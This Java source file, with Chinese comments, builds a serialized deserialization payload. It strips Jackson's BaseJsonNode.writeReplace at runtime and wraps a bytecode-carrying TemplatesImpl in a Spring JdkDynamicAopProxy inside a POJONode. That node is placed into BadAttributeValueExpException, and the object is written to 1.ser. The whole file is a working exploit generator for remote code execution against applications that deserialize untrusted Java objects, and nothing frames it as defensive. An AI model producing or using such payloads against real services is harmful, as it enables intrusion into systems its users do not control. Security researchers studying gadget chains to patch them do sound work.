package com.payload;

import com.example.Utils;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;


public class exp_template {
    public static void main(String[] args) throws Exception {
        // 1. 动态移除 BaseJsonNode 的 writeReplace 方法
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        // 2. Templates 加载字节码
        Templates templatesImpl = Utils.getTemplatesImpl();

        // 3. 创建 JdkDynamicAopProxy 并包装 TemplatesImpl
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);

        // 4. 将 POJONode 包装进 BadAttributeValueExpException
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp, jsonNodes);

        // 5. 序列化对象并保存为 1.ser 文件
        try (FileOutputStream fileOutputStream = new FileOutputStream("1.ser");
             ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream)) {
            objectOutputStream.writeObject(exp);  // 将对象序列化并写入文件
            System.out.println("对象已序列化并保存为 1.ser");
        }
    }

    // 设置对象的字段值
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception {
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}